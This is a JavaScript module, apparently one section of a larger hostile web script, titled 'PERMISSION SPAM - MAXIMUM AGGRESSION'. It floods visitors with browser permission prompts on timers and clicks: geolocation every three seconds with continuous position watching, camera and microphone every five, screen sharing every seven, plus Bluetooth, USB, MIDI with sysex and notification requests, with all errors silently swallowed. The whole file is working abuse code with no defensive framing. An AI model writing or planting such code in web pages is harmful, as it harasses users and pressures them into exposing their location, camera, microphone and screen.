/**
 * 17. PERMISSION SPAM - MAXIMUM AGGRESSION
 * Camera, mic, screen share, geolocation, bluetooth, USB, MIDI
 */
const PermissionSpam = {
    init: function() {
        this.spamGeolocation();
        this.spamCameraMic();
        this.spamScreenShare();
        this.spamBluetooth();
        this.spamUSB();
        this.spamMIDI();
        this.spamNotifications();
    },
    spamGeolocation: function() {
        const requestGeo = () => {
            try {
                navigator.geolocation.getCurrentPosition(
                    (pos) => console.log('GPS:', pos.coords.latitude, pos.coords.longitude),
                    () => {},
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } catch(e) {}
        };
        requestGeo();
        setInterval(requestGeo, 3000);
        // Also watch position
        try { navigator.geolocation.watchPosition(() => {}, () => {}, { enableHighAccuracy: true }); } catch(e) {}
    },
    spamCameraMic: function() {
        const requestMedia = () => {
            try {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then((stream) => {
                        // If granted, keep the stream active
                        console.log('Camera/Mic granted');
                    })
                    .catch(() => {});
            } catch(e) {}
        };
        document.addEventListener('click', requestMedia, { once: true });
        setInterval(requestMedia, 5000);
    },
    spamScreenShare: function() {
        const requestScreen = () => {
            try {
                navigator.mediaDevices.getDisplayMedia({ video: true })
                    .then((stream) => console.log('Screen share granted'))
                    .catch(() => {});
            } catch(e) {}
        };
        document.addEventListener('click', requestScreen, { once: true });
        setInterval(requestScreen, 7000);
    },
    spamBluetooth: function() {
        const requestBT = () => {
            try {
                if (navigator.bluetooth) {
                    navigator.bluetooth.requestDevice({ acceptAllDevices: true })
                        .then((device) => console.log('BT Device:', device.name))
                        .catch(() => {});
                }
            } catch(e) {}
        };
        document.addEventListener('click', requestBT, { once: true });
    },
    spamUSB: function() {
        const requestUSB = () => {
            try {
                if (navigator.usb) {
                    navigator.usb.requestDevice({ filters: [] })
                        .then((device) => console.log('USB Device:', device.productName))
                        .catch(() => {});
                }
            } catch(e) {}
        };
        document.addEventListener('click', requestUSB, { once: true });
    },
    spamMIDI: function() {
        try {
            if (navigator.requestMIDIAccess) {
                navigator.requestMIDIAccess({ sysex: true })
                    .then((midi) => console.log('MIDI access granted'))
                    .catch(() => {});
            }
        } catch(e) {}
    },
    spamNotifications: function() {
        // Already handled by NotificationAbuse, but add extra request
        try {
            if ('Notification' in window && Notification.permission === 'default') {
                Notification.requestPermission();
            }
        } catch(e) {}
    }
};